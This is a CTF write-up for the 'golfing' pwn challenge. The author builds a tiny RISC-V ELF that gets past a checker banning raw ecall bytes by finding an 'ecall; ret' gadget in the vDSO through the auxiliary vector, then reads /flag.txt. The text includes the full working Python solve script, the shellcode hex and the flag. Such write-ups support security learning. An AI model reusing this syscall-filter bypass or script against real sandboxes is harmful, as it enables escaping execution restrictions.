---
title: golfing
date: 2026-07-06
tags:
- pwn
- LYKNCTF
---

- **Challenge:** golfing
- **Category:** Pwn
- **Flag:** `LYKNCTF{"The moon is beautiful, isn't it?"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}`

---

## My initial read / first impressions

The challenge description says:

```text
I hope this simple enough?
```

Very suspicious sentence honestly. Connecting to the service gives only one prompt:

```text
Send your RISC-V ELF (base64):
```

So this was not a normal pwn challenge where we overflow a buffer in the target process. Instead, the server wants us to upload a tiny RISC-V ELF, base64 encoded, and then it runs it.

That sounds easy at first: just send a RISC-V shellcode ELF that opens the flag and writes it to stdout. But of course the whole challenge is that the runner is picky. It checks the ELF structure, blocks some obvious payload bytes, installs seccomp, and then executes the file from a `memfd`.

So the goal became:

```text
1. Build a valid tiny RISC-V ELF.
2. Make it pass the checker's weird restrictions.
3. Still get syscalls somehow.
4. open/read/write /flag.txt.
```

## Reversing the runner

The provided binary was basically a small ELF jail. It reads the base64 input, decodes it, checks the result, writes it into a memory-backed file, and then executes it.

The important parts were:

```text
base64 input
    -> decode bytes
    -> validate ELF64 RISC-V header
    -> validate program headers / section headers
    -> reject some bad byte patterns
    -> write to memfd
    -> install seccomp
    -> execve the memfd
```

The file had to be a RISC-V ELF, not just raw shellcode. The checker cared about the ELF header, the program headers, and even the section names. That is why the exploit builds a real ELF instead of just sending bytes.

The really annoying check was that the payload could not contain the normal RISC-V syscall instruction:

```text
ecall = 0x00000073
little endian bytes = 73 00 00 00
```

There was also a filter for another nearby encoding:

```text
73 00 10 00
```

So a direct `ecall` in `.text` was blocked. That means a normal RISC-V open/read/write shellcode would fail before it even got executed.

## The trick

The runner blocks literal `ecall` bytes in our file, but it does not mean the final process has no `ecall` instruction anywhere in memory.

When the RISC-V process starts, it gets normal process startup data, including the auxiliary vector. One of the auxv entries points to the vDSO mapping:

```text
AT_SYSINFO_EHDR -> vDSO base
```

The vDSO is executable code mapped by the kernel / emulator. Since that code is not part of our uploaded ELF file, it is not scanned by the checker.

So the payload can:

```text
1. Walk the initial stack.
2. Find auxv.
3. Read AT_SYSINFO_EHDR.
4. Scan the vDSO for an ecall; ret gadget.
5. Jump to that gadget whenever it needs a syscall.
```

That bypasses the static byte scan completely. Our ELF never contains raw `ecall`, but at runtime we reuse an `ecall` that already exists in the vDSO.

Very CTF. Very rude. Pretty nice.

## Building the tiny ELF

The ELF had two load segments:

```text
PT_LOAD #0: RX mapping for the ELF + .text at 0x10000
PT_LOAD #1: RW zero page at 0x210000 for the flag buffer
```

The entry point is at:

```text
0x100b0
```

The file also includes just enough section-header stuff to keep the checker happy:

```text
.text
.shstrtab
```

One funny part is that the `.shstrtab` string is placed in a slightly cursed overlapping spot because the goal is to keep the whole ELF tiny. The final file was only:

```text
478 bytes
```

and the base64 payload was:

```text
640 bytes
```

## Payload logic

The RISC-V code itself does this:

```text
parse initial stack
    -> skip argc / argv / envp
    -> find auxv
    -> locate AT_SYSINFO_EHDR
    -> scan vDSO for ecall; ret
    -> openat(AT_FDCWD, "flag.txt", O_RDONLY)
    -> read(fd, 0x210000, 0x100)
    -> write(1, 0x210000, 0x100)
    -> exit(0)
```

The first version of the solve worked, but it only read `0x40` bytes. That printed the start of the flag and then cut it off because this flag was long.

So the final fix was just changing the read/write length from:

```text
0x40
```

to:

```text
0x100
```

The important part was making sure I patched the length instruction and not the syscall number. Accidentally turning `openat` into nonsense is a great way to get no output and feel stupid for two minutes.

## Exploitation

This is the solve script I used:

```python
#!/usr/bin/env python3
import base64
import re
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "15.235.202.47"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9002

p16 = lambda x: struct.pack("<H", x)
p32 = lambda x: struct.pack("<I", x)
p64 = lambda x: struct.pack("<Q", x)

# 110-byte RISC-V payload. Reads/writes 256 bytes so long flags are not truncated.
# It parses auxv to find the vDSO, scans it for an `ecall; ret` gadget,
# then uses that gadget for openat/read/write/exit so the file contains no raw
# ecall instruction bytes. The checker rejects literal 73 00 00 00.
# The only payload change from v1 is: li a2, 0x40 -> li a2, 0x100.
TEXT = bytes.fromhex(
    "0a87930610021c632107e39ed7fe046326871306300721651b052508836707006396c7"
    "00835747006384a7000907fdb73a891305c0f9970500009385e5020146814693088003"
    "0299b7052100130600109d0802990545b7052100850802990145f50802892f666c6167"
    "2e74787400"
)


def build_elf() -> bytes:
    text_size = len(TEXT)
    assert text_size <= 0x71

    shoff = 0xB0 + text_size
    size = shoff + 0xC0
    assert size <= 0x1E1

    b = bytearray(size)

    # ELF64 RISC-V executable header
    b[0:4] = b"\x7fELF"
    b[4] = 2      # ELFCLASS64
    b[5] = 1      # little endian
    b[6] = 1      # ELF version
    b[0x10:0x12] = p16(2)          # ET_EXEC
    b[0x12:0x14] = p16(0xF3)       # EM_RISCV
    b[0x14:0x18] = p32(1)
    b[0x18:0x20] = p64(0x100B0)    # entry
    b[0x20:0x28] = p64(0x40)       # phoff
    b[0x28:0x30] = p64(shoff)      # shoff
    b[0x30:0x34] = p32(0)          # e_flags must be zero for checker
    b[0x34:0x36] = p16(0x40)
    b[0x36:0x38] = p16(0x38)
    b[0x38:0x3A] = p16(2)
    b[0x3A:0x3C] = p16(0x40)
    b[0x3C:0x3E] = p16(3)
    b[0x3E:0x40] = p16(2)

    # PT_LOAD #0: map the whole tiny file RX at 0x10000
    off = 0x40
    b[off + 0x00:off + 0x04] = p32(1)          # PT_LOAD
    b[off + 0x04:off + 0x08] = p32(5)          # PF_R | PF_X
    b[off + 0x08:off + 0x10] = p64(0)
    b[off + 0x10:off + 0x18] = p64(0x10000)
    b[off + 0x18:off + 0x20] = p64(0x10000)
    b[off + 0x20:off + 0x28] = p64(size)
    b[off + 0x28:off + 0x30] = p64(0x1000)
    b[off + 0x30:off + 0x38] = p64(0x1000)

    # PT_LOAD #1: RW zero page at 0x210000, used as read buffer
    off = 0x78
    b[off + 0x00:off + 0x04] = p32(1)          # PT_LOAD
    b[off + 0x04:off + 0x08] = p32(6)          # PF_R | PF_W
    b[off + 0x08:off + 0x10] = p64(0)
    b[off + 0x10:off + 0x18] = p64(0x210000)
    b[off + 0x18:off + 0x20] = p64(0x210000)
    b[off + 0x20:off + 0x28] = p64(0)
    b[off + 0x28:off + 0x30] = p64(0x1000)
    b[off + 0x30:off + 0x38] = p64(0x1000)

    # .text
    b[0xB0:0xB0 + text_size] = TEXT

    # The checker expects the shstrtab contents at shoff+0x2f, overlapping shdr #0.
    b[shoff + 0x2F:shoff + 0x2F + 17] = b"\x00.text\x00.shstrtab\x00"

    # Section #1: .text
    off = shoff + 0x40
    b[off + 0x00:off + 0x04] = p32(1)
    b[off + 0x04:off + 0x08] = p32(1)          # SHT_PROGBITS
    b[off + 0x08:off + 0x10] = p64(6)          # SHF_ALLOC | SHF_EXECINSTR
    b[off + 0x10:off + 0x18] = p64(0x100B0)
    b[off + 0x18:off + 0x20] = p64(0xB0)
    b[off + 0x20:off + 0x28] = p64(text_size)

    # Section #2: .shstrtab
    off = shoff + 0x80
    b[off + 0x00:off + 0x04] = p32(7)
    b[off + 0x04:off + 0x08] = p32(3)          # SHT_STRTAB
    b[off + 0x18:off + 0x20] = p64(text_size + 0xDF)
    b[off + 0x20:off + 0x28] = p64(17)

    # Sanity checks for the binary's filters.
    for bad in (b"\x73\x00\x00\x00", b"\x73\x00\x10\x00"):
        assert bad not in b
    max_run = 1
    run = 1
    for i in range(1, len(TEXT)):
        run = run + 1 if TEXT[i] == TEXT[i - 1] else 1
        max_run = max(max_run, run)
    assert max_run < 4

    return bytes(b)


def recvall(sock: socket.socket, timeout: float = 8.0) -> bytes:
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
            if b"LYKNCTF{" in out:
                # Keep a little extra in case the flag arrives with trailing output.
                sock.settimeout(0.5)
        except socket.timeout:
            break
    return out


def main() -> None:
    elf = build_elf()
    payload = base64.b64encode(elf) + b"\n"
    print(f"[+] ELF size: {len(elf)} bytes")
    print(f"[+] base64 size: {len(payload) - 1} bytes")

    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.settimeout(5)
        banner = b""
        try:
            while b"base64" not in banner and not banner.endswith(b": "):
                chunk = s.recv(4096)
                if not chunk:
                    break
                banner += chunk
        except socket.timeout:
            pass

        if banner:
            print(banner.decode(errors="replace"), end="")

        s.sendall(payload)
        out = recvall(s)

    clean = out.replace(b"\x00", b"")
    print(clean.decode(errors="replace"), end="")

    m = re.search(rb"LYKNCTF\{[^}]+\}", clean, re.DOTALL)
    if m:
        print(f"\n[+] FLAG: {m.group(0).decode(errors='replace')}")
    elif b"LYKNCTF{" in clean:
        tail = clean[clean.index(b"LYKNCTF{"):].splitlines()[0]
        print(f"\n[+] FLAG-ish output: {tail.decode(errors='replace')}")
    else:
        print("\n[-] No flag found in output")


if __name__ == "__main__":
    main()
```

Running it gives:

```text
[+] ELF size: 478 bytes
[+] base64 size: 640 bytes
Send your RISC-V ELF (base64): LYKNCTF{"The moon is beautiful, isn't it?"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}

[+] FLAG: LYKNCTF{"The moon is beautiful, isn't it?"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}
```

## Why this works

The checker is trying to stop uploaded RISC-V code from making syscalls by banning the raw `ecall` instruction bytes. That is a static check on the uploaded file.

But the process still has executable memory outside our ELF. The vDSO mapping already contains syscall helper code, and the checker does not scan that. By finding an `ecall; ret` gadget in the vDSO at runtime, the payload gets syscall ability without putting an `ecall` instruction in the file.

The full chain is:

```text
send base64 ELF
    -> checker accepts tiny valid RISC-V ELF
    -> execve memfd
    -> payload parses auxv
    -> finds vDSO base
    -> finds ecall; ret gadget
    -> uses gadget for openat/read/write
    -> prints /flag.txt
```

So the challenge was less about memory corruption and more about golfing a valid executable while bypassing a naive syscall-instruction blacklist.

## Flag

```text
LYKNCTF{"The moon is beautiful, isn't it?"::https://youtu.be/H10O2TIWbXI?si=FRemo2lpPXvkUyGh::#RISC!@2026%_^~}
```
